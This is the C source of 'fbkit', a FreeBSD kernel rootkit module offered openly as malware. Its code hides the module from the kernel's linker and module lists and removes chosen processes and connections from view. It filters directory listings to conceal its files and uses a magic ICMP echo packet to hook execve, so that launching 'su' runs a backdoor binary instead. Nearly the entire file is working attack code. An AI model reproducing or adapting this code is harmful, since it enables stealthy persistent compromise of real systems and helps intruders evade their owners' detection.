/*******************************************************************************
*                ____                     _ __                                 *
*     ___  __ __/ / /__ ___ ______ ______(_) /___ __                           *
*    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                           *
*   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                            *
*                                            /___/ team                        *
*                                                                              *
* fbkit                                                                        *
* A FreeBSD rootkit for the 1337 h4x0rs out there.                             *
*                                                                              *
* FILE                                                                         *
* fbkit.c                                                                      *
*                                                                              *
* NOTES                                                                        *
* pr1v4te m4t3ri4l - d0n't publ1sh 0r 1 w1ll pwn y0u!                          *
*                                                                              *
* AUTHOR                                                                       *
* noptrix@nullsecurity.net                                                     *
*                                                                              *
*******************************************************************************/

#include "fbkit.h"


/* our system call for conn_hiding */
static int conn_offset = 211;

/* hides connection (ports) of reverse connect */
static int conn_hiding(struct thread *td, void *syscall_args)
{
    struct conn_hiding_args *uap;
    uap = (struct conn_hiding_args *) syscall_args;

    struct inpcb *inpb;

    INP_INFO_WLOCK(&V_tcbinfo);

    LIST_FOREACH(inpb, V_tcbinfo.ipi_listhead, inp_list) {
        if (inpb->inp_vflag & INP_TIMEWAIT) {
            continue;
        }
        INP_WLOCK(inpb);
        if (uap->fport == ntohs(inpb->inp_inc.inc_ie.ie_fport)) {
            LIST_REMOVE(inpb, inp_list);
        }
        INP_WUNLOCK(inpb);
    }
    INP_INFO_WUNLOCK(&V_tcbinfo);

    return 0;
}

static struct sysent conn_hiding_sysent = {
    1,
    conn_hiding
};


/* our system call for ps_hiding */
static int ps_offset = 210;

/* hides "sux" (su) proccess */
static int ps_hiding(struct thread *td, void *syscall_args)
{
    struct proc *p;
    struct ps_hiding_args *uap;
    uap = (struct ps_hiding_args *) syscall_args;

    sx_xlock(&allproc_lock);

    LIST_FOREACH(p, &allproc, p_list) {
        PROC_LOCK(p);

        if (!p->p_vmspace || (p->p_flag & P_WEXIT)) {
            PROC_UNLOCK(p);
            continue;
        }
        if (strncmp(p->p_comm, uap->p_comm, MAXCOMLEN) == 0) {
            LIST_REMOVE(p, p_list);
        }
        PROC_UNLOCK(p);
    }
    sx_xunlock(&allproc_lock);

    return 0;
}

static struct sysent ps_hiding_sysent = {
    1,
    ps_hiding
};


/* hides dirs and files containing pattern "sux" and "fbkit" */
static int getdirentries_hook(struct thread *td, void *syscall_args)
{
    struct dirent *dp, *current;
    unsigned int size, count;

    struct getdirentries_args *uap;
    uap = (struct getdirentries_args *) syscall_args;

    getdirentries(td, syscall_args);
    size = td->td_retval[0];

    if (size > 0) {
        MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
        copyin(uap->buf, dp, size);

        current = dp;
        count = size;

        while ((current->d_reclen != 0) && (count > 0)) {
            count -= current->d_reclen;

            /* hide sux binary */
            if (strcmp((char *) &(current->d_name), N_EVIL) == 0) {
                if (count != 0) {
                    bcopy((char *) current + current->d_reclen, current, count);
                }
                size -= current->d_reclen;
                //break;
            }

            /* hide KLD binary */
            if (strcmp((char *) &(current->d_name), RKIT_NAME) == 0) {
                if (count != 0) {
                    bcopy((char *) current + current->d_reclen, current, count);
                }
                size -= current->d_reclen;
                break;
            }

            if (count != 0) {
                current = (struct dirent *)((char  *) current + current->d_reclen);
            }
        }
        td->td_retval[0] = size;
        copyout(dp, uap->buf, size);
        FREE(dp, M_TEMP);
    }
    return 0;
}


/* execve() hook when "su" is launched */
static int execve_hook(struct thread *td, void *syscall_args)
{
    struct execve_args *uap;
    uap = (struct execve_args *) syscall_args;

    struct execve_args kernel_ea;
    struct execve_args *user_ea;
    struct vmspace *vm;
    vm_offset_t base, addr;
    char t_fname[] = EVIL;

    if (strcmp(uap->fname, TOFUCK) == 0) {
        vm = curthread->td_proc->p_vmspace;
        base = round_page((vm_offset_t) vm->vm_daddr);
        addr = base + ctob(vm->vm_dsize);

        vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE, VM_PROT_ALL,
                    VM_PROT_ALL, 0);
        vm->vm_dsize += btoc(PAGE_SIZE);

        copyout(&t_fname, (char *) addr, strlen(t_fname));
        kernel_ea.fname = (char *) addr;
        kernel_ea.argv = uap->argv;
        kernel_ea.envv = uap->envv;

        user_ea = (struct execve_args *) addr + sizeof(t_fname);
        copyout(&kernel_ea, user_ea, sizeof(struct execve_args));

        return (execve(curthread, user_ea));
    }
    return (execve(td, syscall_args));
}


/* wait for our magic icmp packet and start execve() hook */
void icmp_input_hook(struct mbuf *m, int off)
{
    struct icmp *icp;
    int hlen = off;

    m->m_len -= hlen;
    m->m_data += hlen;

    icp = mtod(m, struct icmp *);

    m->m_len += hlen;
    m->m_data -= hlen;

    if (icp->icmp_type == ICMP_ECHO && strncmp(icp->icmp_data, TRIGGER, strlen(TRIGGER)) == 0) {
        if (m->m_len == T_SIZE) {
            sysent[SYS_execve].sy_call = (sy_call_t *) execve_hook;
        }
    } else {
        icmp_input(m, off);
    }
    return;
}


/* hides our KLD */
static void hide_lkm(void)
{
    struct linker_file *lf;
    struct module *mod;

    mtx_lock(&Giant);
    sx_xlock(&kld_sx);

    (&linker_files)->tqh_first->refs--;

    TAILQ_FOREACH(lf, &linker_files, link) {
        if (strcmp(lf->filename, RKIT_NAME) == 0) {
            next_file_id--;
            TAILQ_REMOVE(&linker_files, lf, link);
            break;
        }
    }
    sx_xunlock(&kld_sx);
    mtx_unlock(&Giant);

    sx_slock(&modules_sx);

    TAILQ_FOREACH(mod, &modules, link) {
        if (strcmp(mod->name, "fbkit") == 0) {
            nextid--;
            TAILQ_REMOVE(&modules, mod, link);
            break;
        }
    }
    sx_sunlock(&modules_sx);

    return;
}

static int load(struct module *module, int cmd, void *arg)
{
    hide_lkm();

    switch (cmd) {
     case MOD_LOAD:
         inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
         sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirentries_hook;
         SYSCALL_MODULE(ps_hiding, &ps_offset, &ps_hiding_sysent, load, NULL);
         SYSCALL_MODULE(conn_hiding, &conn_offset, &conn_hiding_sysent, load, NULL);
         break;
     case MOD_UNLOAD:
         sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirentries;
         inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
         sysent[SYS_execve].sy_call = (sy_call_t *) execve;
         break;
     default:
         break;
    }

    return 0;
}

static moduledata_t fbkit_mod = {
    RKIT_NAME,
    load,
    NULL
};

DECLARE_MODULE(fbkit, fbkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);

/* EOF */
